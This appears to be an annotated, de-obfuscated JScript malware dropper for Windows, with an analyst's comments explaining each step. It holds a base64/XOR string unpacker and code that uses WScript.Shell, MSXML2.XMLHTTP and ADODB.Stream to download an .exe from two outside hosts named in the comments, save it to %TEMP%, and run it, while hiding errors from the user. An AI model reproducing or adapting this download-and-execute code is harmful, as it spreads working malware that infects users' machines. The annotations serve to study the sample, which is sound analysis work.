
// This is the Un-Obfuscated Crypto Dl'r. When a var has an "Unpacker" func
// The first comment is what the var used to be and the second in "" is the out
// of the unpacker function.

var _base64Idx = [
    /*43 -43 = 0*/
    /*'+',  1,  2,  3,'/' */
    62, -1, -1, -1, 63,

    /*'0','1','2','3','4','5','6','7','8','9' */
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

    /*15, 16, 17,'=', 19, 20, 21 */
    -1, -1, -1, 64, -1, -1, -1,

    /*65 - 43 = 22*/
    /*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

    /*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
    13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

    /*91 - 43 = 48 */
    /*48, 49, 50, 51, 52, 53 */
    -1, -1, -1, -1, -1, -1,

    /*97 - 43 = 54*/
    /*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

    /*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
    39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
    var out = output;
	// if output doesn't exist
	if(!out) {
	// out = 8 bit unsigned array of length (round up int(length of input / 4) * 3)
        out = new Uint8Array(Math.ceil(input.length / 4) * 3);
    }

	// remove all non-base64 characters
	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');
	// offset = itself or 0
	offset = offset || 0;
	// declare some variables
    	var enc1, enc2, enc3, enc4;
	// declare i and j for loop
	var i = 0, j = offset;

    while(i < input.length) {
	// this is just an array lookup, the key is at the top.
        enc1 = _base64Idx[input.charCodeAt(i++) - 43];
        enc2 = _base64Idx[input.charCodeAt(i++) - 43];
        enc3 = _base64Idx[input.charCodeAt(i++) - 43];
        enc4 = _base64Idx[input.charCodeAt(i++) - 43];
	
	/* the array (out) in the index of offset + 1; 
	is the higher of enc1 shifted left 2 or enc2 shifted right 2
	*/
        out[j++] = (enc1 << 2) | (enc2 >> 4);
	// if enc3 is not 64 NOT ANTHONY
        if(enc3 !== 64) {
		// decoded at least 2 bytes NOT ANTHONY
		// out[offset + 2] = ((enc2 and 15) lshift 4) or (enc3 rshift 2)
		out[j++] = ((enc2 & 15) << 4) | (enc3 >> 2);
		if(enc4 !== 64) {
                	// decoded 3 bytes NOT ANTHONY
			// out[offset + 3] = ((enc3 and 3) lshift 6) or enc4;
                	out[j++] = ((enc3 & 3) << 6) | enc4;
            }
        }
    }

	// make sure result is the exact decoded length NOT ANTHONY
	// Pretty sure this makes an output comparison between (j - offset) and out.subarray(0, j)
	return output ?
        	(j - offset) :
        	out.subarray(0, j);
}

// This looks to be a decoder essentially
var unPacker = function (packedText) {
	// Array buffer
	var buffer = [];
	// Get decoded length of packedText
	var length = decode(packedText, buffer);
	// Creates a string
	var charCodeAt = "charCodeAt";
	// Creates result string
	var result = "";
	// while i is less than decoded length
	for (var i = 0; i < length; i++) {
		// append result with buffer[i] XOR "string"[notsurewhatthisis](remainder of i / string.length)
		result += String.fromCharCode(buffer[i] ^ charCodeAt(i % 16));
    }
    return result;
};

// sultrysZf
// create function 
var createFunction = function() {
	// unassumingw2Y
	// create sub function
	var subFunction = function() {};
	subFunction.prototype.create = function(wscriptObject) {
        	return WScript.CreateObject(wscriptObject);
    	};
    return subFunction;
}
();

(function() {
	// disgorgeOmL
	// this is an object generator.
	var newFunction = new createFunction();
	// foistX8F
	// sets the correct 200 OK return status
	var succStatus = 200;
	// notwithstandingRqL
	// "GET"
	var httpGet = unPacker('"ITcg"');
	// sentinelFbM
	// "Exec"
	var strExec = unPacker('"IwoRNQ=="');
	// preternaturalsKK
	// "Wscript.Shell"
	var strWShell = unPacker('"MSEXJFsWTU9gEg1aOw=="');
	// firebrandNBi
	// This is to build an application that processes XML
	// "MSXML2.XMLHTTP"
	var strBuildXML = unPacker('"KyEsG35UFzl+NiBiA2I="');
	// didacticccT
	// "QfsJBbmlSn", The next 4 var's arn't used anywhere
	var unUsedVar1 = unPacker('"NxQHHHAEVA1gFA=="');
	// palliatelfx
	// "O797YGu9JC"
	var unUsedVar2 = unPacker('"KUVNYWshTFh5OQ=="');
	// encumberzqD
	// "MNDeBhUfuI"
	var unUsedVar3 = unPacker('"KzwwM3AObAdGMw=="');
	// enervaterr8
	// "U2KlKoQSDD"
	 var unUsedVar4 = unPacker('"M0A/OnkJaDJ3Pg=="');
	// gustyJm6
	// "ADODB", added to another string below
	var strPartial = unPacker('"JzY7EnA="');
	// interdicto7i
	// "Stream"
	var strStream = unPacker('"NQYGM1ML"');
	// exorbitantSzN
	// "%TEMP%\"
	var strTemp = unPacker('"QyYxG2JDZQ=="');
	// conceptsjG
	// ".exe"
	var strExe = unPacker('"SBcMMw=="');
	// pacifisthxc
	// Not sure why calc this every time but it's 254976
	var xmlOffset = Math.pow(2, 10) * 249;
	// suavityv52
	// This is an array of length 2, unpacking 2 strings.
	// "http://helloyoungmanqq.com/26.exe", "http://helloyoungmanff.com/26.exe"
	var urlArray = [unPacker('"DgYAJghJFglWFgRZLl0cJgEfFThDFxcCXBdHBGEcDDAD"'), unPacker('"DgYAJghJFglWFgRZLl0cJgEfFThUABcCXBdHBGEcDDAD"')];
	// herculeanLKY
	// Not sure the significance but this is in bytes, it's exactly 2048 kb
	var intByte = 2097152;
	// gratisI38
	// Creates a shell function
	var funcShell = newFunction.create(strWShell);
	// rampartnN6
	// creates an XML build function
	var funcXML = newFunction.create(strBuildXML);
	// furnishe1e
	// Creates a ADODB.Stream function
	var funcStream = newFunction.create(strPartial + unPacker('"SA=="') /* This is just a "." */ + strStream);
	// pacifistYY4
	// This looks to take env-var strings and replaces them with values defined for the current user
	var getUsrValues = funcShell.ExpandEnvironmentStrings(strTemp);
	// ensconceMUl
	// This is just to name the file something random
	var fileName = getUsrValues + intByte + strExe;
	// insensateimn
	// This is just to check if get/save of the file was successful
	var isSuccess = false;
	// for all url's in array
	for (var i = 0; i < urlArray.length; i++) {
		// try to
        	try {
			// set url to urlArray Index i
            		var url = urlArray[i];
			// open an XMLHttp connection to url
            		funcXML.open(httpGet, url, false);
			// get connection status
            		funcXML.send();
			// if 200 "OK"
            		if (funcXML.status == succStatus) {
				// try to
                		try {
					// open a stream with url
                    			funcStream.open();
					// set stream type to text I believe
                    			funcStream.type = 1;
					// "responseBody"
					// This writes the stream to funcXML's responseBody attribute.
                    			funcStream.write(funcXML[unPacker('"FBcHJl0ISgRxFQxP"')]);
					// if the size of the stream is greater than this, we got the whole file.
                    			if (funcStream.size > xmlOffset) {
						// set i to 2, since the urlArray never changes
                        			i = urlArray.length;
						// set cursor position to 0
                        			funcStream.position = 0;
						// read and save to file (random file name, overwrite any existing save)
                       				funcStream.saveToFile(fileName, 2);
						// set the success var ("We're leaving this false")
                        			isSuccess = false;
                    			}
				// Close the stream if unsuccessful
                		} finally {
                    			funcStream.close();
               	 		}
            		}
			// ignore all errors, so as not to alert user
        	} catch (ignored) {}
    	}
	// if success var is true
	if (isSuccess) {
		// execute the downloaded URL
        	funcShell[strExec](getUsrValues + Math.pow(2, 21));
    }
})();
